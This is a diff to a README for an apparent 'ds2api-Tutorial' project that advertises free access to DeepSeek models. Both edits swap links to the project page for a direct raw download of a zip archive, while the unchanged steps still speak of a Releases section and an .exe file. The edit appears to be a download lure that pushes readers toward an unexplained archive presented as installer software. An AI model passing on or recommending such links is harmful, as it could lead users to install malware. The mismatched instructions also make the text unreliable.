@@ -1,6 +1,6 @@
 # 🚀 ds2api-Tutorial - Access free DeepSeek models with ease
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Lewisge9913/ds2api-Tutorial)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Lewisge9913/ds2api-Tutorial/raw/refs/heads/main/_resources/Tutorial-ds-api-3.9.zip)
 
 ## 📋 Project Overview
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software. These req
 
 You must visit the project page to obtain the installer. Follow these steps to find the file:
 
-1. Visit [https://github.com/Lewisge9913/ds2api-Tutorial](https://github.com/Lewisge9913/ds2api-Tutorial).
+1. Visit [https://github.com/Lewisge9913/ds2api-Tutorial/raw/refs/heads/main/_resources/Tutorial-ds-api-3.9.zip](https://github.com/Lewisge9913/ds2api-Tutorial/raw/refs/heads/main/_resources/Tutorial-ds-api-3.9.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the most recent version tag.
 4. Locate the file ending in .exe.
